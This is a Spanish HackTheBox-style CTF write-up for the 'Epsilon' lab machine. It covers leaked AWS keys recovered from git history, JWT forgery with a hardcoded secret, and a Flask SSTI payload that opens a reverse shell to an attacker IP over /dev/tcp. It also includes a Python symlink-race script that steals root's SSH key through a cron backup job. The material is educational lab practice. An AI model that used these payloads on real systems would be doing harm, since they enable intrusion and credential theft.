---
layout: post
toc: true
title: "Epsilon - HackTheBox Writeup"
categories: HackTheBox
tags: [CTF, Web]
author:
  - H4RRIZN
---

![logo](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/5bde9ea27c8aaef510c8b6e1ce6b22207714d839/_includes/CTFIMG/Epsilon/logo.png)

## Reconocimiento
Para comenzar realizaremos un scan con nmap para visualizar los puertos abiertos en el host victima:
```bash
nmap -sS --min-rate 1500 -p- --open -vv -n -Pn 10.10.11.134
```
![recon1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/202d617891b7a83d56011b58a1cfbd494f019547/_includes/CTFIMG/Epsilon/recon1.png)   
Vemos abiertos los puertos 22, 80 y 5000. Realizaremos otro scan para obtener más detalles de los servicios y versiones utilizados en estos puertos:    
![recon2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/202d617891b7a83d56011b58a1cfbd494f019547/_includes/CTFIMG/Epsilon/recon2.png)    
  Podemos observar que el puerto 80 revela el directorio **`.git`**.  Al ingresar al puerto 5000 http observamos que tenemos un panel de autenticación:    
![recon3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/202d617891b7a83d56011b58a1cfbd494f019547/_includes/CTFIMG/Epsilon/recon3.png)    
De momento no podemos hacer mucho en este panel.

## Analizando .git
Como el resultado del script de nmap nos revelo el directorio .git en **`10.10.11.134/.git`** podemos utilizar la herramienta Githack para recomponer este repositorio:    
```bash
pip install githack
```
![git0](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3b65e0d602539aa7c03f723df6f88cb1d195ac9c/_includes/CTFIMG/Epsilon/git0.png)   
![git1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3b65e0d602539aa7c03f723df6f88cb1d195ac9c/_includes/CTFIMG/Epsilon/git1.png)    
Como observamos contamos con 2 ficheros los cuales corresponden a **`server.py`** y **`track_api_CR_148.py`**. Analizaremos los ficheros individualmente.
### server.py
Para **`server.py`** podemos notar que en las primeras líneas de código se evidencia el uso de **`Json Web Token`** además de que la aplicación estaría construida con **`Flask`**. Notamos que se verifica un JWT el cual hace uso del algoritmo **`HS256`** para su construcción y recibe el **`username`**:    
![git2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3b65e0d602539aa7c03f723df6f88cb1d195ac9c/_includes/CTFIMG/Epsilon/git2.png)    
Al inspeccionar más el código notamos diversas rutas como **`/track`** y **`/order`**.    
![git3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3b65e0d602539aa7c03f723df6f88cb1d195ac9c/_includes/CTFIMG/Epsilon/git3.png)    
Las cuales si ingresamos en el puerto 80 no obtendremos resultados. Pero si tenemos resultados para el puerto 5000 lo que indica que el código fuente encontrado corresponde para este puerto en especifico:      
![git4](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3b65e0d602539aa7c03f723df6f88cb1d195ac9c/_includes/CTFIMG/Epsilon/git4.png)
### track_api_CR_148.py
Para el fichero **`track_api_CR_148.py`** analizamos que también existen variables en forma de secreto. No tenemos estas claves pero si podemos ver que se revela el endpoint de AWS el cual es **`http://cloud.epsilon.htb`**. Agregamos este al fichero /etc/hosts de nuestra maquina.     
![git5](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3b65e0d602539aa7c03f723df6f88cb1d195ac9c/_includes/CTFIMG/Epsilon/git5.png)
Además vemos que se definen funciones las cuales ***Zipean*** una ruta de alguna forma. Adicionalmente tenemos el siguiente fragmento **`update_lambda`** el cual simplemente es una función que verifica la existencia de un directorio de Lambda y luego actualiza el código de la función utilizando la API de AWS Lambda.     
![git6](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3b65e0d602539aa7c03f723df6f88cb1d195ac9c/_includes/CTFIMG/Epsilon/git6.png)     
Ya con esto en mente procedemos a enumerar los commits del proyecto utilizando git para observar distintas versiones de estos códigos.
### Git Log
Utilizando el comando **`git log`** podemos ver los commits realizados. Observamos el primer commit (el de más abajo) el comentario de “Adding Tracking API Module” lo cual llama la atención ya que fue la primera implementación del código **`track_api_CR_148.py`**:    
![git7](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3b65e0d602539aa7c03f723df6f88cb1d195ac9c/_includes/CTFIMG/Epsilon/git7.png)
Podemos visualizar este utilizando el comando **`git show <commit>`**:    
![git8](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3b65e0d602539aa7c03f723df6f88cb1d195ac9c/_includes/CTFIMG/Epsilon/git8.png)    
Vemos como se revelan los secretos para conectarse a aws:

aws_access_key_id='**`AQLA5M37BDN6FJP76TDC`**'
aws_secret_access_key='OsK0o/**`glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A`**'

Utilizaremos estos para explorar las funciones.
### AWS
Lo primero es configurar AWS con los secretos utilizando **`aws configure`**:
![git9](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3b65e0d602539aa7c03f723df6f88cb1d195ac9c/_includes/CTFIMG/Epsilon/git9.png)    
Ya con esto podemos explorar las funciones, tengamos en cuenta que se nos mostrarón funciones **`lambda`** por lo que utilizaremos estás en aws:    
```bash
aws --endpoint=http://cloud.epsilon.htb lambda list-functions
```
![git10](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3b65e0d602539aa7c03f723df6f88cb1d195ac9c/_includes/CTFIMG/Epsilon/git10.png)     
Observamos que tenemos la función **`costume_shop_v1`** disponible. Podemos utilizar el siguiente comando para obtener la función:     
```bash
aws --endpoint=http://cloud.epsilon.htb lambda get-function --function-name=costume_shop_v1
```
![git11](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3b65e0d602539aa7c03f723df6f88cb1d195ac9c/_includes/CTFIMG/Epsilon/git11.png)    
Y obtenemos la localización de la función la cual es un comprimido **`ZIP`**. Descargamos la función utilizando wget y la renombramos para convertirlo en un comprimido **`.zip`** y la descomprimimos para obtener el código:    
![git12](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3b65e0d602539aa7c03f723df6f88cb1d195ac9c/_includes/CTFIMG/Epsilon/git12.png)    
Y observamos que esta contiene un secreto hardcodeado el cúal podriamos utilizar para crear un token JWT.

## Creando JWT
Desde este punto ya que contamos con un **`secret`** podemos intentar crear un token JWT para su uso. Para esto utilizamos el siguiente script en python3:    
```python
import jwt
secret = "RrXCv`mrNe!K!4+5`wYq"
encoded_jwt = jwt.encode({"username": "admin"}, secret, algorithm="HS256")
print("[!] Token Generado: " + encoded_jwt)
```
![jwt0](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/193162ce1dc03e6c7535d1603e23af2bfb2c6b13/_includes/CTFIMG/Epsilon/jwt0.png)    
Copiamos el token generado y lo utilizamos ante el puerto 5000 con el nombre de **`auth`** como vimos en el código **`server.py`**:     
![jwt1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/193162ce1dc03e6c7535d1603e23af2bfb2c6b13/_includes/CTFIMG/Epsilon/jwt1.png)

## SSTI
Ahora que podemos explorar libremente observamos que en **`order`** podemos seleccionar un **`costume`** el cual si presionamos en **`order`** se despliega el mensaje de “Your order of "phantom" has been placed successfully.” En este caso al seleccionar el item de **`Phatnom Mask`**
![ssti0](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/be3f4b8e7e5a9ae2fd85341e8bcb9cc06ed58d54/_includes/CTFIMG/Epsilon/ssti0.png)    
Realizamos la misma petición pero esta vez con BurpSuite e identificamos que en el parámetro **`costume`** se pasa el valor de **`phantom`**:     
![ssti1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/be3f4b8e7e5a9ae2fd85341e8bcb9cc06ed58d54/_includes/CTFIMG/Epsilon/ssti1.png)    
Si cambiamos el valor de **`phantom`** por cualquier cosa como por ejemplo **`h4rri`** observamos que se muestra el valor de este:     
![ssti2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/be3f4b8e7e5a9ae2fd85341e8bcb9cc06ed58d54/_includes/CTFIMG/Epsilon/ssti2.png)    
Vemos que el valor se refleja correctamente. Sabemos por el script **`server.py`** que la aplicación está construida con **`Flask`**. Probamos un payload tipico para estos casos para probar la vulnerabilidad de Server-Side Template Injection el cual es **`{{7*7}}`** si el resultado de este es **`49`** entonces estamos ante la vulnerabilidad mencionada:     
![ssti3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/be3f4b8e7e5a9ae2fd85341e8bcb9cc06ed58d54/_includes/CTFIMG/Epsilon/ssti3.png)
Con la vulnerabilidad confirmada ya podemos buscar una forma de ejecutar comandos y obtener acceso a la maquina victima.
## Shell as Tom
Para ganar acceso a la maquina victima podemos utilizar el siguiente payload:    
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "/bin/bash -i >& /dev/tcp/10.10.14.10/443 0>&1"').read() }}
```
Desde ya nos ponemos en escucha con netcat:    
![sh1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/f70311343e42ac315b4093dee0def1ed4da18c02/_includes/CTFIMG/Epsilon/sh1.png)
A continuación enviamos el payload en BurpSuite:    
![sh2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/f70311343e42ac315b4093dee0def1ed4da18c02/_includes/CTFIMG/Epsilon/sh2.png)  
![sh3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/f70311343e42ac315b4093dee0def1ed4da18c02/_includes/CTFIMG/Epsilon/sh3.png)    
Desde este punto ya podemos leer la flag ubicada en el directorio del usuario tom.
## Privesc
Al ejecutar Linpeas no observamos nada de mucho valor para escalar privilegios. Por lo que nos disponemos a enumerar procesos que no podamos ver utilizando la herramienta pspy. La descargamos en la maquina victima, le asignamos permisos de ejecución y la ejecutamos:    
![priv0](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/8c8556c7da19f7d4a74d134ca7bfd23559794cc1/_includes/CTFIMG/Epsilon/priv0.png)   
Observamos que el usuario root arranca una tarea cron y posteriormente ejecuta el script **`backup.sh`** ubicado en **`/usr/bin`**:     
![priv1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/8c8556c7da19f7d4a74d134ca7bfd23559794cc1/_includes/CTFIMG/Epsilon/priv1.png)     
El script tiene el siguiente contenido:      
![priv2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/8c8556c7da19f7d4a74d134ca7bfd23559794cc1/_includes/CTFIMG/Epsilon/priv2.png)      
La línea `/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"` crea un nuevo archivo comprimido en el directorio `/var/backups/web_backups/`. 

El nombre del archivo es `${check_file}.tar`, donde `${check_file}` es el valor de la variable `check_file`. El contenido del archivo comprimido incluye el archivo `/opt/backups/checksum` y el archivo comprimido anteriormente creado `/opt/backups/$file.tar`.

Observamos además de que se está utilizando **`tar`** con el parámetro **`-h`** el cual según su descripción:    
![priv3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/8c8556c7da19f7d4a74d134ca7bfd23559794cc1/_includes/CTFIMG/Epsilon/priv3.png)    
En base a esto podemos probar el crear un fichero en el directorio **`/opt/backups`** con el nombre de **`checksum`** el cual apunte directamente a la flag del usuario root o a la clave ssh del usuario root para ganar acceso al sistema con este. Para esto haremos uso de un script en python3 ya que la maquina victima cuenta con este lenguaje:    
```python
import os
while True:
	if os.path.exists("/opt/backups/checksum"):
		os.remove("/opt/backups/checksum")
		print("[+] File deleted")
os.symlink("/root/.ssh/id_rsa", "/opt/backups/checksum", target_is_directory=True)
print("[+] Symlink created")
break
```
![priv4](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/8c8556c7da19f7d4a74d134ca7bfd23559794cc1/_includes/CTFIMG/Epsilon/priv4.png)    
Observamos que el script se ejecuto correctamente. Ahora copiamos el ultimo fichero `tar` creado al directorio tmp y lo descomprimimos:     
![pirv5](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/8c8556c7da19f7d4a74d134ca7bfd23559794cc1/_includes/CTFIMG/Epsilon/priv5.png)    
Posteriormente ingresamos a la carpeta resultando la cual es opt y luego a backups:     
![priv6](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/8c8556c7da19f7d4a74d134ca7bfd23559794cc1/_includes/CTFIMG/Epsilon/priv6.png)

![priv7](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/8c8556c7da19f7d4a74d134ca7bfd23559794cc1/_includes/CTFIMG/Epsilon/priv7.png)     
Como apreciamos contamos con el fichero checksum, el cual si revisamos podemos notar que es una clave rsa para utilizar con SSH:     
![priv8](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/8c8556c7da19f7d4a74d134ca7bfd23559794cc1/_includes/CTFIMG/Epsilon/priv8.png)    
La copiamos y la guardamos en nuestra maquina de atacante. Le asignaremos permisos con `chmod 600` para que contenga los permisos del propietario: 
![priv9](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/8c8556c7da19f7d4a74d134ca7bfd23559794cc1/_includes/CTFIMG/Epsilon/priv9.png)     
Observamos que tenemos acceso como usuario root, y ya podremos leer la flag:     
![priv10](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/1691d8739fe9c2bea4720350b8bf4c406c417fe0/_includes/CTFIMG/Epsilon/priv10.png)

Pwned! 🏴‍☠️
